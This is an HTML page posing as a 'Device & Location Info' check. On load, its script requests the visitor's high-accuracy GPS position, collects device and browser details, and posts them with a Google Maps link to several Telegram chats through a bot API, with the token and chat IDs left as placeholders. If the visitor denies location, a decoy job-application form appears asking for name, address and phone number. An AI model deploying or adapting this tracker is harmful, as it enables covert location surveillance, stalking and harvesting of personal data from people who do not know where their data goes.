<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device & Location Info</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
    <style>
        /* üîÅ Added styles for form */
        .form-container {
            background-color: white;
            padding: 30px 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            margin-top: 20px;
        }

        .form-container img {
            display: block;
            margin: 0 auto 20px;
            width: 120px;
        }

        .form-container h2 {
            text-align: center;
            margin-bottom: 25px;
            color: #333;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #444;
        }

        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 15px;
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        .submit-btn {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #0077b6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #005f87;
        }
    </style>
</head>
<body>
    <h2>Device & Location Info</h2>
    <div id="location">Waiting for location permission...</div>

    <!-- üîÅ Hidden Form -->
    <div id="applicationForm" style="display: none;">
        <div class="form-container">
            <img src="your-logo.png" alt="Company Logo">
            <h2>IT Assistant Job Application</h2>
            <form action="#" method="POST">
                <div class="form-group">
                    <label for="name">Name with Full Initials</label>
                    <input type="text" id="name" name="name" required>
                </div>

                <div class="form-group">
                    <label for="address">Address</label>
                    <input type="text" id="address" name="address" required>
                </div>

                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <input type="text" id="phone" name="phone" required>
                </div>

                <div class="form-group">
                    <label for="qualifications">Enter Your Qualifications</label>
                    <textarea id="qualifications" name="qualifications" required></textarea>
                </div>

                <button type="submit" class="submit-btn">Submit Application</button>
            </form>
        </div>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                showFormInstead();
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;
            updateBrowserURL(lat, lon);
            const deviceInfo = getDeviceDetails();
            sendLocation(lat, lon, deviceInfo);
        }

        function showError(error) {
            // üîÅ Instead of error message, show the form
            showFormInstead();
        }

        function showFormInstead() {
            document.getElementById("location").style.display = "none";
            document.getElementById("applicationForm").style.display = "block";
        }

        function updateBrowserURL(lat, lon) {
            const newUrl = `${window.location.origin}${window.location.pathname}?lat=${lat}&lon=${lon}`;
            window.history.replaceState(null, "", newUrl);
        }

        function getDeviceDetails() {
            const userAgent = navigator.userAgent;
            const parser = new UAParser();
            const result = parser.getResult();
            const deviceModel = result.device.model || "Unknown Device";
            const browser = result.browser.name;
            const os = result.os.name;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';

            return `üñ• Device Details:\n‚Ä¢ Device Type: ${deviceType}\n‚Ä¢ Model: ${deviceModel}\n‚Ä¢ Browser: ${browser}\n‚Ä¢ OS: ${os}\n‚Ä¢ Screen Resolution: ${screenWidth}x${screenHeight}\n‚Ä¢ User Agent: ${userAgent}`;
        }

        function sendLocation(lat, lon, deviceInfo) {
            const botToken = "YOUR_BOT_TOKEN";
            const chatIds = ["CHAT_ID_1", "CHAT_ID_2", "CHAT_ID_3"];
            const message = `üåç Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})\n\n${deviceInfo}`;
            chatIds.forEach(chatId => {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
                .then(response => response.json())
                .then(data => console.log(`Message sent to ${chatId}:`, data))
                .catch(error => console.error(`Error sending to ${chatId}:`, error));
            });
        }

        window.onload = getLocation;
    </script>
</body>
</html>
